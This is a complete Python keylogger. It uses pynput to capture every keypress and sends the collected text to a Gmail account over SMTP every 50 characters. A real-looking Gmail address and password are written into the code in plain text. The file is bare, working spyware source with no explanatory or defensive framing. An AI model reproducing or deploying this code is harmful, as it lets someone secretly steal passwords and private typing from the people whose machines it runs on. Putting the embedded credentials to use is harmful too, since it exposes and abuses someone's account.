from glob import glob
import smtplib

from pynput.keyboard import Key,Listener

# set up email
email = "thanchemgiokda001@gmail.com"
password = "31012001Th"
server = smtplib.SMTP_SSL('smtp.gmail.com',465)
server.login(email,password)

# logger
full_log= ''
word = ''
email_char_limit = 50

def on_press(key):
    global word
    global full_log
    global email
    global email_char_limit
    
    if key == Key.space :
        word += ' '
        full_log += word
        word = ''
        if len(full_log)>= email_char_limit:
            send_log()
            full_log = ''
            
    elif key == Key.shift_l or key == Key.shift_r:
        return        
    elif key ==Key.backspace:
        word = word[:-1]
    elif key == Key.enter:
        word += '\n'
        full_log += word
        word = ''        
    else:
        char = f'{key}'
        char = char[1:-1]
        word += char            
    
    if key == Key.esc:
        return False       
 
def send_log():
    server.sendmail(
        email,
        email,
        full_log
    )            
    
with Listener(on_press=on_press) as listener:
    listener.join()   